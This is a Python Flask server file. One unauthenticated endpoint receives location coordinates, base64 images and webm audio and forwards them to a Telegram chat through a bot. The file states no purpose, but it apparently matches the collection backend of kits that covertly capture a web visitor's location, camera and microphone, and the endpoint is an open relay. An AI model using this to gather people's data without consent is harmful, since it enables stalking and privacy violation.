from flask import Flask, request, jsonify
from dotenv import load_dotenv
import requests
import base64
import os

# Load .env variables
load_dotenv()

app = Flask(__name__)

# Get the Telegram Bot token securely
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("❌ BOT_TOKEN is not set in environment.")

TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"


# Send plain text to user
def send_text(user_id, text):
    requests.post(f"{TELEGRAM_API_URL}/sendMessage", json={
        "chat_id": user_id,
        "text": text
    })


# Send image to user (base64 format)
def send_photo(user_id, image_data_url):
    try:
        header, encoded = image_data_url.split(",", 1)
        image_bytes = base64.b64decode(encoded)

        files = {
            "photo": ("image.jpg", image_bytes)
        }
        data = {
            "chat_id": user_id
        }
        requests.post(f"{TELEGRAM_API_URL}/sendPhoto", data=data, files=files)
    except Exception as e:
        print(f"[ERROR] send_photo: {e}")


# Send audio to user (base64 format)
def send_audio(user_id, audio_data_url):
    try:
        header, encoded = audio_data_url.split(",", 1)
        audio_bytes = base64.b64decode(encoded)

        files = {
            "audio": ("audio.webm", audio_bytes)
        }
        data = {
            "chat_id": user_id
        }
        requests.post(f"{TELEGRAM_API_URL}/sendAudio", data=data, files=files)
    except Exception as e:
        print(f"[ERROR] send_audio: {e}")


@app.route("/api/send", methods=["POST"])
def handle_data():
    data = request.get_json()
    user_id = data.get("user_id")

    if not user_id:
        return jsonify({"error": "Missing user_id"}), 400

    if "location" in data:
        loc = data["location"]
        send_text(user_id, f"📍 Location:\nLatitude: {loc['lat']}\nLongitude: {loc['lon']}")

    if "image" in data:
        send_photo(user_id, data["image"])

    if "audio" in data:
        send_audio(user_id, data["audio"])

    return jsonify({"status": "success"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
